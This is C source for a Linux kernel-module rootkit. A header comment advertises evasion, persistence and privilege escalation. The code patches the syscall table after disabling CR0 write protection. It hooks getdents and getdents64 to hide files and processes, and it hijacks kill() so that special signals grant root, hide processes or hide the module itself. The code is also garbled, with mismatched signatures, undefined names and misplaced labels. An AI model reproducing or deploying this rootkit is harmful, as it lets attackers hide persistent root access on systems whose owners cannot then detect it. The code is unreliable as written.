/*

Made by Arthur
In collaboration with Rodrigo Teofilo

A Rootkit is a type of malicious software designed to gain unauthorized access
and control over a computer or network. The Ruby Rootkit, leverages the characteristics
to stealthily embed itself within the systems, making detection and removal
particular challenging.

A sophiscated malware stealthily infiltrating systems built with
Ruby integration, levaraging Ruby's dynamic features, it poses several threats

like as

Evasion: Utilizes dynamic script manipulation, avoiding traditional antiviruses
Privilege Escalation: Seeks unathorized control, potentially leading to data theft and system manipulation
Persistence: Embeds deeply with the system, resisting removal attempts
Stealthy Communication: Establishes covert channels for remote control
Polymorphics: Constantly alters code structure, challeging signature-based detection


Ruby Rootkit © Todos os direitos reservados
Terminated on 03/2024

*/


//                                      Libraries
//---------------------------------------------------+
#include<linux/kernel.h>//                           |
#include<linux/module.h>//                           |
#include "library/ftrace_helper.h"//                 |
#include "library/Ruby.h"//                          |
#include<linux/dirent.h>//                           |
//---------------------------------------------------+
//                                                                 Global Data
//--------------------------------------------------------------------------------------+
unsigned long *__sysc_table;//                                                          |
typedef asmlinkage (*t_syscall)(const struct pt_regs *);//                              |
//                                                                                      |
static t_syscall orig_getdents;//                                                       |
static t_syscall orig_getdents64;//                                                     |
static t_syscall orig_kill;//                                                           |
//--------------------------------------------------------------------------------------+

//                                                    Returning syscall table address  
//--------------------------------------------------------------------------------------+
unsigned long *__ret_syscall_table(void)//                                              |
{//                                                                                     |
    unsigned long *__sys_call_t;//                                                      |
    __sys_call_t = (unsigned long *)kallsyms_lookup_name("sys_call_table");//           |
//                                                                                      |
    return __sys_call_t;//                                                              |
}//-------------------------------------------------------------------------------------+

//                                                             Structing task list
//--------------------------------------------------------------------------------------+
struct task_struct *find_task(pid_t pid)//                                              |
{//                                                                                     |
    struct task_struct *p = current;//                                                  |
    for_each_process(p)//                                                               |
    {//                                                                                 |
        if(p->pid == pid)//                                                             |
        return p;//                                                                     |
    }//                                                                                 |
//                                                                                      |
    return NULL;//                                                                      |
}//-------------------------------------------------------------------------------------+

//                                     Checking if is invisible
//----------------------------------------------------------------+
int is_invisible(pid_t pid)//                                     |
{//                                                               |
    struct task_struct *task;//                                   |
    if(!pid)//                                                    |
        return 0;//                                               |
    task = find_task(pid);//                                      |
    if(!task)//                                                   |
        return 0;//                                               |
    if(task->flags & 0x10000000)//                                |
        return 1;//                                               |
//                                                                |
    return 0;//                                                   |
}//---------------------------------------------------------------+

//                              Privilege Escalation Function
//------------------------------------------------------------+
void rubyRoot(void)//                                         |
{//                                                           |
    struct cred *rubyCreds;//                                 |
    rubyCreds = prepare_creds();//                            |
    if(rubyCreds == NULL)//                                   |
        return;//                                             |
//                                                            |
    rubyCreds->uid = rubyCreds->gid = 0;//                    |
    rubyCreds->euid = rubyCreds->egid = 0;//                  |
    rubyCreds->suid = rubyCreds->sgid = 0;//                  |
    rubyCreds->fsuid = rubyCreds->fsgid = 0;//                |
//                                                            |
    commit_creds(rubyCreds);//                                |
//                                                            |
}//-----------------------------------------------------------+

//                                      Hidding Ruby (Rootkit)
//--------------------------------------------------------------+
static inline void tidy(void)//                                 |
{//                                                             |
    kfree(THIS_MODULE->sect_attrs);//                           |
    THIS_MODULE->sect_attrs = NULL;//                           |
}//                                                             |
//                                                              |
static struct list_head *rubyPrevious;//                        |
static short rubyHidden;//                                      |
//                                                              |
void module rubyActive(void)//                                  |
{//                                                             |
    list_add(&THIS_MODULE->list, rubyPrevious);//               |
    rubyHidden = 0;//                                           |
}//                                                             |
//                                                              |
void rubyInactive(void)//                                       |
{//                                                             |
    rubyPrevious = THIS_MODULE->list.prev;//                    |
    list_del(&THIS_MODULE->list);//                             |
//                                                              |
    rubyHidden = 1;//                                           |
}//                                                             |
//--------------------------------------------------------------+

//                                                                            GETDENTS64 CORRUPTION
//------------------------------------------------------------------------------------------------------------+
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);//                                          |
asmlinkage int rthxr_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)//    |
{//                                                                                                           |
    int fd = (int)pt_regs->di;//                                                                              |
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;//                                       |
//                                                                                                            |
    int ret = orig_getdents64(pt_regs), err;//                                                                |
//                                                                                                            |
    unsigned short proc = 0;//                                                                                |
    unsigned long off = 0;//                                                                                  |
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;//                                                     |
    struct inode *d_inode;//                                                                                  |
//                                                                                                            |
    if (ret <= 0)//                                                                                           |
        return ret;//                                                                                         |
//                                                                                                            |        
    kdirent = kzalloc(ret, GFP_KERNEL);//                                                                     |
    if(kdirent == NULL)//                                                                                     |
        return ret;//                                                                                         |
//                                                                                                            |
    err = copy_from_user(kdirent, dirent, ret);//                                                             |
    if (err)//                                                                                                |
        goto out;//                                                                                           |
//                                                                                                            |
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;//                                          |
//                                                                                                            |
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)//                                          |
        proc = 1;//                                                                                           |
//                                                                                                            |
    while (off < ret)//                                                                                       |
    {//                                                                                                       |
        dir = (void *)kdirent + off;//                                                                        |
        if((!proc && (memcmp(RTHXR, dir->d_name, strlen(RTHXR)) == 0)) || (proc && //                         |
        is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {//                                             |
            if(dir == kdirent)//                                                                              |
            {//                                                                                               |
                ret -= dir->d_reclen;//                                                                       |
                memmove(dir, (void *)dir + dir->d_reclen, ret);//                                             |
                continue;//                                                                                   |
            }//                                                                                               |
            prev->d_reclen += dir->d_reclen;//                                                                |
        } else {//                                                                                            |
            prev = dir;//                                                                                     |
            off += dir->d_reclen;//                                                                           |
        }//                                                                                                   |
        err = copy_to_user(dirent, kdirent, ret);//                                                           |
        if (err)//                                                                                            |
            goto out;//                                                                                       |
//                                                                                                            |
        out://                                                                                                |
            kfree(kdirent);//                                                                                 |
            return ret;//                                                                                     |
    }//                                                                                                       |
//                                                                                                            |
}//                                                                                                           |
//------------------------------------------------------------------------------------------------------------+


//                                                                              GETDENTS CORRUPTION
//-------------------------------------------------------------------------------------------------------------+
static asmlinkage long (*rthxr_getdents)(const struct pt_regs *);//                                            |
asmlinkage int rthxr_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)//       |
{//                                                                                                            |
    int fd = (int)pt_regs->di;//                                                                               |
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;//                                        |
//                                                                                                             |
    int ret = orig_getdents(pt_regs), err;//                                                                   |
//                                                                                                             |
    unsigned short proc = 0;//                                                                                 |
    unsigned long off = 0;//                                                                                   |
    struct linux_dirent *dir, *kdirent, *prev = NULL;//                                                        |
    struct inode *d_inode;//                                                                                   |
//                                                                                                             |
    if (ret <= 0)//                                                                                            |
        return ret;//                                                                                          |
//                                                                                                             |        
    kdirent = kzalloc(ret, GFP_KERNEL);//                                                                      |
    if(kdirent == NULL)//                                                                                      |
        return ret;//                                                                                          |
//                                                                                                             |
    err = copy_from_user(kdirent, dirent, ret);//                                                              |
    if (err)//                                                                                                 |
        goto out;//                                                                                            | 
//                                                                                                             |
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;//                                           |
//                                                                                                             |
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)//                                           |
        proc = 1;//                                                                                            |
//                                                                                                             |
    while (off < ret)//                                                                                        |
    {//                                                                                                        |
        dir = (void *)kdirent + off;//                                                                         |
        if((!proc && (memcmp(RTHXR, dir->d_name, strlen(RTHXR)) == 0)) || (proc && //                          |
        is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {//                                              |
            if(dir == kdirent)//                                                                               |
            {//                                                                                                |
                ret -= dir->d_reclen;//                                                                        |
                memmove(dir, (void *)dir + dir->d_reclen, ret);//                                              |
                continue;//                                                                                    | 
            }//                                                                                                |
            prev->d_reclen += dir->d_reclen;//                                                                 |
        } else {//                                                                                             |
            prev = dir;//                                                                                      |
            off += dir->d_reclen;//                                                                            |
        }//                                                                                                    |
        err = copy_to_user(dirent, kdirent, ret);//                                                            |
        if (err)//                                                                                             |
            goto out;//                                                                                        |
//                                                                                                             |
        out://                                                                                                 |
            kfree(kdirent);//                                                                                  |
            return ret;//                                                                                      |
    }//                                                                                                        |
//                                                                                                             |
}//------------------------------------------------------------------------------------------------------------+

//                                             Kill corruption
//------------------------------------------------------------------+
asmlinkage int rthxr_kill(const struct pt_regs *pt_regs)//          |
{//                                                                 |
    pid_t pid = (pid_t) pt_regs->di;//                              |
    int sig = (int)pt_regs->si;//                                   |
//                                                                  |
    struct task_struct *task;//                                     |
    switch(sig)//                                                   |
    {//                                                             |
        case SIGINVIS://                                            |
            if((task = find_task(pid)) == NULL)//                   |
                return -ESRCH;//                                    |
            task->flags ^= 0x10000000;//                            |
            break;//                                                | 
//                                                                  |
        case SIGSUPER://                                            |
            rubyRoot();//                                           |
            break;//                                                |
//                                                                  |
        case SIGMODINVIS://                                         |
            if (rubyHidden) rubyActive();//                         |
            else rubyInactive();//                                  |
            break;//                                                |
//                                                                  |
        default://                                                  |
            return orig_kill(pt_regs);//                            |
    }//                                                             |
//                                                                  |
    return 0;//                                                     |
}//                                                                 |
//------------------------------------------------------------------+



//                                                   Defeating Memory Protection
//---------------------------------------------------------------------------+
unsigned long cr0;//                                                         |
static inline void _cr0(unsigned long value)//                               |
{//                                                                          |
    unsigned long __force_order;//                                           |
    asm volatile("mov %0, %%cr0": "+r"(value), "+m"(__force_order));//       |
}//                                                                          |
//---------------------------------------------------------------------------+


//                                                                 LOADING AND UNLOADING RUBY (ROOTKIT)
//--------------------------------------------------------------------------------------------------------------+
static int __init rubyRootkit_init(void)//                                                                      | loading function
{//                                                                                                             |
    cr0 = read_cr0();//                                                                                         | reading cr0 register value
    unsigned long *__syscall_table = __ret_sysc_table();//                                                      | return syscall table address
    _cr0(cr0 & ~0x00010000);//                                                                                  | defeating memory protection
//                                                                                                              |
    orig_getdents = (t_syscall)__syscall_table[__NR_getdents];//                                                | saving current getdents
    orig_getdents64 = (t_syscall)__syscall_table[__NR_getdents64];//                                            | saving current getdents64
    orig_kill = (t_syscall)__syscall_table[__NR_kill];//                                                        | saving current kill
//                                                                                                              |
    __syscall_table[__NR_getdents] = (unsigned long)rthxr_getdents;//                                           | corrupting syscall table
    __syscall_table[__NR_getdents64] = (unsigned long)rthxr_getdents64;//                                       | corrupting syscall table
    __syscall_table[__NR_Kill] = (unsigned long)rthxr_kill;//                                                   | corrupting syscall table
//                                                                                                              |
    _cr0(__cr0);//                                                                                              | protecting memory
    return 0;//                                                                                                 | ($w$) 
}//                                                                                                             |
//--------------------------------------------------------------------------------------------------------------+
static void __exit rubyRootkit_exit(void)//                                                                     | unloading function
{//                                                                                                             |
    cr0 = read_cr0();//                                                                                         | reading cr0 register value
    unsigned long *__syscall_table = __ret_sysc_table();//                                                      | return syscall table address
//                                                                                                              |
    __cr0(cr0 & ~0x00010000);//                                                                                 | defeating memory protection
//                                                                                                              | 
    __syscall_table[__NR_getdents] = (unsigned long)orig_getdents;//                                            | restoring getdents
    __syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;//                                        | restoring getdents64
    __syscall_table[__NR_kill] = (unsigned long)orig_kill;//                                                    | restoring kill
//                                                                                                              |
    __cr0(cr0);//                                                                                               | protecting memory
    return NULL;//                                                                                              | ~(88)^>
}//                                                                                                             |
//--------------------------------------------------------------------------------------------------------------+
MODULE_LICENSE("Dual BSD/GPL");//                                                                               | License code
MODULE_AUTHOR("Arthur/Rodrigo");//                                                                              | Credits ~
MODULE_DESCRIPTION("Rootkit w/ Ruby integration");//                                                            | Driver description
//--------------------------------------------------------------------------------------------------------------+
module_init(rubyRootkit_init);//                                                                                | Driver Initialization
module_exit(rubyRootkit_exit);//                                                                                | Driver Destruction
//--------------------------------------------------------------------------------------------------------------+
